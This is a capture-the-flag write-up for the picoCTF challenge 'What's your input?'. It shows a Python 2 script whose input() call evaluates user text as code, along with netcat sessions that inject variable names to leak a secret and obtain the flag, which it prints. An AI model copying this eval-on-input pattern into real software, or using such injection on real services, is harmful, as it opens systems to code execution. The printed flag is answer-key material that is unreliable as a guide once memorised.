# What's your input?

## Description

Author: madStacks

We'd like to get your input on a couple things. Think you can answer my questions correctly? in.py nc mercury.picoctf.net 61858.

## Challenge

We are given a python script that loads a random city from a file and asks us to guess the city.
If we guess correctly, we are given the flag.

### Source code

```py
#!/usr/bin/python2 -u
import random

cities = open("./city_names.txt").readlines()
city = random.choice(cities).rstrip()
year = 2018

print("What's your favorite number?")
res = None
while not res:
    try:
        res = input("Number? ")
        print("You said: {}".format(res))
    except:
        res = None

if res != year:
    print("Okay...")
else:
    print("I agree!")

print("What's the best city to visit?")
res = None
while not res:
    try:
        res = input("City? ")
        print("You said: {}".format(res))
    except:
        res = None

if res == city:
    print("I agree!")
    flag = open("./flag").read()
    print(flag)
else:
    print("Thanks for your input!")
```

## Solution

Note that the script runs `python2`.
In this version, the `input` function evaluates user input as a python command, rather than storing it as a string.

We can therefore leak the city by typing `city` when it asks us to guess the year, then use this as our input when it asks for the city.
Note that, when entering the city name, it must be encapsulated in quotes to be treated as a string.

```
-> % nc mercury.picoctf.net 61858
What's your favorite number?
Number? city
You said: Orlando
Okay...
What's the best city to visit?
City? "Orlando"
You said: Orlando
I agree!
picoCTF{v4lua4bl3_1npu7_7607377}
```

Alternatively, since the program is checking `if res == city:`, we can simply set `res` to `city`:

```
-> % nc mercury.picoctf.net 61858
What's your favorite number?
Number? 1
You said: 1
Okay...
What's the best city to visit?
City? city
You said: Bellevue
I agree!
picoCTF{v4lua4bl3_1npu7_7607377}
```

## Flag

`picoCTF{v4lua4bl3_1npu7_7607377}`

